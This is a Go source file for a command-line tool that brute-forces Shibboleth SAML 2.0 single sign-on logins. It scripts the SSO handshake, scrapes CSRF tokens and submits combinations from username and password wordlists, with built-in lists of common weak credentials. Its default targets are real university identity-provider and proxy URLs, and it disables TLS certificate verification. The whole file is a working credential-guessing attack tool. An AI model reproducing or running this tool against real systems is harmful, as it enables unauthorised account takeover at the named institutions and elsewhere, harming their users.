package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.com/PuerkitoBio/goquery"
	log "github.com/sirupsen/logrus"
)

var client = http.Client{
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

func main() {
	log.SetFormatter(&log.JSONFormatter{})

	var usePOSTFlow bool
	flag.BoolVar(&usePOSTFlow, "pf", true, "Shibboleth SAML 2.0 POST SSO Flow (default)")

	var useRedirectFlow bool
	flag.BoolVar(&useRedirectFlow, "rf", false, "Shibboleth SAML 2.0 Redirect SSO Flow")

	var userToUse string
	flag.StringVar(&userToUse, "u", "", "user to use")

	var serviceProviderInitURL string
	flag.StringVar(&serviceProviderInitURL, "su", "", "the service provider start URL which initiates the authentication flow")

	var identityProviderURL string
	flag.StringVar(&identityProviderURL, "iu", "", "the identity provider base URL (everything before /idp, https://example.com)")

	var usernameList string
	flag.StringVar(&usernameList, "ul", "", "path to file containing a list of user names to use")

	var passwordList string
	flag.StringVar(&passwordList, "pl", "", "path to file containing a list of passwords to use")

	flag.Parse()

	/*
		Initialization section stating the base URLs and Init SP URL as well as some HTTP transport specific
		(no automatic redirect, no certificate validation) configurations.
	*/

	// Url for Shibboleth service provider requesting authentication with the identity provider
	if serviceProviderInitURL == "" {
		serviceProviderInitURL = "https://login.ezproxy.vetmeduni.ac.at/login?url=https://c8fj0utb8h1t6vm8qc9gcexubbeyyyyyn.s2s.si"
	}

	// Base URL of the Identity provider
	if identityProviderURL == "" {
		identityProviderURL = "https://idp.vu-wien.ac.at"
	}

	// Create default settings which ignore insecure certificates and doesn't perform automatic redirect loading
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	var doc *goquery.Document
	var sessionId string

	if useRedirectFlow {
		doc, sessionId = initializeSAML2RedirectFlow(identityProviderURL, serviceProviderInitURL)
	} else {
		doc, sessionId = initializeSAML2POSTFlow(identityProviderURL, serviceProviderInitURL)
	}
	/*
		Open the username and password lists from the file system. If none has been specified
		the internal short list of usernames and passwords are used
	*/
	users, passwords := openWordlists(usernameList, passwordList)

	if userToUse != "" {
		log.Info("Performing brute force attack using only one user name:", userToUse)
		for _, pass := range passwords {
			doc = performSAML2Authentication(doc, identityProviderURL, sessionId, userToUse, pass)
		}
	}
	for _, user := range users {
		log.Info("Performing brute force attack using user name:", user)
		for _, pass := range passwords {
			doc = performSAML2Authentication(doc, identityProviderURL, sessionId, user, pass)
		}
	}
}

func openWordlists(usernameList string, passwordList string) ([]string, []string) {
	var users, passwords []string

	if usernameList != "" {

		file, err := os.Open(usernameList)
		if err != nil {
			log.Fatal(err)
		}
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			users = append(users, scanner.Text())
		}
	} else {
		users = strings.Split("root\nadmin\nadministrator\nAdministrator\ntest\nguest\ninfo\nadm\nuser", "\n")
	}
	if passwordList != "" {

		file, err := os.Open(passwordList)
		if err != nil {
			log.Fatal(err)
		}
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			passwords = append(passwords, scanner.Text())
		}

	} else {
		passwords = strings.Split("password\n123456\n12345678\nabc123\nquerty\nmonkey\nletmein\ndragon\n111111\nbaseball\niloveyou\ntrustno1\n1234567\nsunshine\nmaster\n123123\nwelcome\nshadow\nashley\nfootbal\njesus\nmichael\nninja\nmustang\n1234\n12345\ntequiero\ntest", "\n")

	}
	return users, passwords
}

func initializeSAML2RedirectFlow(baseURL string, serviceProviderURL string) (*goquery.Document, string) {
	/*
		STEP 1: Get the SAML request from the intended service provider

		Creating the initial SAML authentication request as crafted from the service provider. This uses an GET request
		to the service provider to obtain the contained information and SAML request.
	*/
	resp, doc := sendGet(serviceProviderURL, "", "", "")
	log.Debug("Performed SP GET to obtain the information prepared by the service provider to initiate the authentication flow")
	// If successful the identity provider responds with a redirect to the next step in the authentication flow.

	location, err := resp.Location()
	if err != nil {
		log.Fatalf("Request failed: " + err.Error())
	}

	/*
		STEP 1: Get the SAML request from the intended service provider

		Creating the initial SAML authentication request as crafted from the service provider. This uses an GET request
		to the service provider to obtain the contained information and SAML request.
	*/
	resp, doc = sendGet(location.String(), "", "", "")
	log.Debug("Performed IDP GET to initiate the authentication flow from the service provider")

	location, err = resp.Location()
	if err != nil {
		log.Fatalf("Request failed: " + err.Error())
	}

	sessionId := resp.Cookies()[0].String()

	/*
		STEP 3: Obtain information for authentication status check

		The next step in the authentication flow is usually some configuration of the involved javascript which instructs
		obtaining information stored in the local storage in order to check if the user is already authenticated.
		Therefore, a GET request is performed whose response contains the javascript which is automatically executed and
		performs the check and sends automatically a POST thereafter.
	*/
	resp, doc = sendGet(location.String(), "", sessionId, "")
	log.Debug("Performed IDP GET to perform the configuration / authentication status check in the authentication flow")

	/*
		Getting the required information from the response, such as the CSRF token and the action URL, and prepare them
		for the post as data.
	*/
	var initPostData = `&shib_idp_ls_exception.shib_idp_session_ss=&shib_idp_ls_success.shib_idp_session_ss=true&
shib_idp_ls_value.shib_idp_session_ss=&shib_idp_ls_exception.shib_idp_persistent_ss=&
shib_idp_ls_success.shib_idp_persistent_ss=true&shib_idp_ls_value.shib_idp_persistent_ss=&
shib_idp_ls_supported=true&_eventId_proceed=`

	element := getElementOrAttributeValueFromDocument(doc, "input[name='csrf_token']", "value")
	log.Debug("Obtained SAMLRequest from response: %s", element[0])
	formAction := getElementOrAttributeValueFromDocument(doc, "form", "action")
	log.Debug("Obtained actionURL from response: %s", formAction[0])

	endpoint := formAction[0]
	if !IsUrl(formAction[0]) {
		endpoint = baseURL + formAction[0]
	}

	postData := "csrf_token=" + element[0] + initPostData
	/*
		STEP 4: Post current authentication status and configuration

		Sending the authentication status and the configuration as obtained from the local storage. In our case we
		always send the empty local storage contents.
		TODO: Check if there could be some issue with the local storage content. Check manual
	*/
	resp, doc = sendPost(endpoint, postData, sessionId, "")
	log.Debug("Performed IDP POST providing some configuration data (as redirect)")

	// If successful the identity provider responds with a redirect to the next step in the authentication flow
	location, err = resp.Location()
	if err != nil {
		log.Fatalf("Request failed: " + err.Error())
	}

	/*
		STEP 5: Prepare for authentication

		Obtain the final form which is used to send credentials for authentication. The contained csrf_token and the
		action url are required as input for the next step.
	*/
	resp, doc = sendGet(location.String(), "", sessionId, "")
	log.Debug("Performed redirected IDP GET request after configuration")

	return doc, sessionId

}

func initializeSAML2POSTFlow(baseURL string, serviceProviderURL string) (*goquery.Document, string) {
	/*
		STEP 1: Get the SAML request from the intended service provider

		Creating the initial SAML authentication request as crafted from the service provider. This uses an GET request
		to the service provider to obtain the contained information and SAML request.
	*/
	resp, doc := sendGet(serviceProviderURL, "", "", "")
	log.Debug("Performed SP GET to obtain the information prepared by the service provider to initiate the authentication flow")

	/*
		Getting the required information from the response such as the SAMLRequest and the action URL.
		In a browser the next steps are automatically performed via redirects. We do it manually in order have
		control.
	*/
	element := getElementOrAttributeValueFromDocument(doc, "input[name='SAMLRequest']", "value")
	log.Debug("Obtained entry from response: %s", element[0])
	state := getElementOrAttributeValueFromDocument(doc, "input[name='RelayState']", "value")
	log.Debug("Obtained entry from response: %s", element[0])
	formAction := getElementOrAttributeValueFromDocument(doc, "form", "action")
	log.Debug("Obtained actionURL from response: %s", formAction[0])

	endpoint := formAction[0]
	if !IsUrl(formAction[0]) {
		endpoint = baseURL + formAction[0]
	}

	postData := "RelayState=" + url.QueryEscape(state[0]) + "&SAMLRequest=" + url.QueryEscape(element[0])

	/*
		STEP 2: POST SAML request to initiate the authentication flow

		Sending the authentication start to the identity provider using SAML 2.0 HTTP Post Binding. The POST contains
		the SAMLRequest as created by the service provider as body post data URL encoded. Usually this is performed
		automatically with browser redirects.
	*/
	resp, doc = sendPost(endpoint, postData, "", "")
	log.Debug("Performed IDP POST to initiate the authentication flow from the service provider")

	// If successful the identity provider responds with a redirect to the next step in the authentication flow.
	location, err := resp.Location()
	if err != nil {
		log.Fatalf("Request failed: " + err.Error())
	}
	// Also, the response must contain a cookie for the session which has been initiated
	sessionId := resp.Cookies()[0].String()

	/*
		STEP 3: Obtain information for authentication status check

		The next step in the authentication flow is usually some configuration of the involved javascript which instructs
		obtaining information stored in the local storage in order to check if the user is already authenticated.
		Therefore, a GET request is performed whose response contains the javascript which is automatically executed and
		performs the check and sends automatically a POST thereafter.
	*/
	resp, doc = sendGet(location.String(), "", sessionId, "")
	log.Debug("Performed IDP GET to perform the configuration / authentication status check in the authentication flow")

	/*
		Getting the required information from the response, such as the CSRF token and the action URL, and prepare them
		for the post as data.
	*/
	var initPostData = `&shib_idp_ls_exception.shib_idp_session_ss=&shib_idp_ls_success.shib_idp_session_ss=true&
shib_idp_ls_value.shib_idp_session_ss=&shib_idp_ls_exception.shib_idp_persistent_ss=&
shib_idp_ls_success.shib_idp_persistent_ss=true&shib_idp_ls_value.shib_idp_persistent_ss=&
shib_idp_ls_supported=true&_eventId_proceed=`

	element = getElementOrAttributeValueFromDocument(doc, "input[name='csrf_token']", "value")
	log.Debug("Obtained SAMLRequest from response: %s", element[0])
	formAction = getElementOrAttributeValueFromDocument(doc, "form", "action")
	log.Debug("Obtained actionURL from response: %s", formAction[0])

	endpoint = formAction[0]
	if !IsUrl(formAction[0]) {
		endpoint = baseURL + formAction[0]
	}

	postData = "csrf_token=" + element[0] + initPostData
	/*
		STEP 4: Post current authentication status and configuration

		Sending the authentication status and the configuration as obtained from the local storage. In our case we
		always send the empty local storage contents.
		TODO: Check if there could be some issue with the local storage content. Check manual
	*/
	resp, doc = sendPost(endpoint, postData, sessionId, "")
	log.Debug("Performed IDP POST providing some configuration data (as redirect)")

	// If successful the identity provider responds with a redirect to the next step in the authentication flow
	location, err = resp.Location()
	if err != nil {
		log.Fatalf("Request failed: " + err.Error())
	}

	/*
		STEP 5: Prepare for authentication

		Obtain the final form which is used to send credentials for authentication. The contained csrf_token and the
		action url are required as input for the next step.
	*/
	resp, doc = sendGet(location.String(), "", sessionId, "")
	log.Debug("Performed redirected IDP GET request after configuration")

	return doc, sessionId
}

func performSAML2Authentication(doc *goquery.Document, baseURL string, sessionId string, user string, pass string) *goquery.Document {
	/*
		Getting the required information from the response, such as the CSRF token and the action URL, and prepare them
		for the post as data.
	*/
	element := getElementOrAttributeValueFromDocument(doc, "input[name='csrf_token']", "value")
	log.Debug("Obtained SAMLRequest from response: %s", element[0])
	formAction := getElementOrAttributeValueFromDocument(doc, "form", "action")
	log.Debug("Obtained actionURL from response: %s", formAction[0])

	endpoint := formAction[0]
	if !IsUrl(formAction[0]) {
		endpoint = baseURL + formAction[0]
	}

	authPostData := fmt.Sprintf("&j_username=%s&j_password=%s&_eventId_proceed=", user, pass)
	postData := "csrf_token=" + element[0] + authPostData
	/*
		STEP 6: Perform authentication using credentials

		Send the user credentials using a POST request to the identity provider to authenticated for the initially
		specified service provider.
	*/
	resp, doc := sendPost(endpoint, postData, sessionId, "")
	log.Debug("Performed authentication IDP POST request")

	// If successful the identity provider responds with a redirect to the next step in the authentication flow
	location, err := resp.Location()
	if err != nil {
		log.Fatalf("Location not found: " + err.Error())
	}
	/*
		STEP 7: Check authentication result

		Obtain the authentication result from the previous authentication POST request.
		This can either indicate that the user is unknown, the password is wrong or an success.
	*/
	resp, doc = sendGet(location.String(), "", sessionId, "")
	log.Debug("Performed redirected IDP GET request after authentication")

	/*
		Getting the required information from the response, such as error information of the authentication result.
	*/
	authInfo := getElementOrAttributeValueFromDocument(doc, "p.form-element.form-error", "")
	log.Debug("Returned authentication error information: %s", authInfo[0])
	return doc
}

func sendPost(url string, data string, cookie string, contentType string) (*http.Response, *goquery.Document) {
	return sendRequest("POST", url, data, cookie, contentType)
}

func sendGet(url string, data string, cookie string, contentType string) (*http.Response, *goquery.Document) {
	return sendRequest("GET", url, data, cookie, contentType)
}

func sendRequest(method string, url string, data string, cookie string, contentType string) (*http.Response, *goquery.Document) {
	// Creating the initial SAML authentication request from the service provider
	req, err := http.NewRequest(method, url, bytes.NewBufferString(data))

	if err != nil {
		log.Fatalf("Sending GET request failed: %s", err.Error())
	}

	if contentType == "" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		req.Header.Set("Content-Type", contentType)
	}

	if cookie != "" {
		req.Header.Add("Cookie", cookie)
	}

	resp, err := client.Do(req)

	if err != nil {
		log.Fatalf("Request failed: %s ", err.Error())
	}

	defer resp.Body.Close()

	if resp.StatusCode != http.StatusFound && resp.StatusCode != http.StatusOK {
		log.Fatalf("Returned status code error: %d %s", resp.StatusCode, resp.Status)
	}

	log.Debug("GET request to %s sent successfully", url)

	doc := getDocumentFromResponse(resp)

	return resp, doc
}

func getDocumentFromResponse(response *http.Response) *goquery.Document {
	doc, err := goquery.NewDocumentFromReader(response.Body)
	if err != nil {
		log.Error(err)
	}
	return doc
}

func getElementOrAttributeValueFromDocument(doc *goquery.Document, elementName string, attributeName string) map[int]string {
	var htmlEntries = make(map[int]string)
	doc.Find(elementName).Each(func(index int, node *goquery.Selection) {
		if attributeName != "" {
			nodeValue, exists := node.Attr(attributeName)
			if exists {
				log.Debug("Found value {} for node element {}", elementName, nodeValue)
				htmlEntries[len(htmlEntries)] = nodeValue
			}
		} else {
			nodeValue := node.Text()
			log.Debug("Using value {} for node attribute {}", attributeName, nodeValue)
			htmlEntries[len(htmlEntries)] = nodeValue
		}
	})
	return htmlEntries
}

func IsUrl(str string) bool {
	u, err := url.Parse(str)
	return err == nil && u.Scheme != "" && u.Host != ""
}
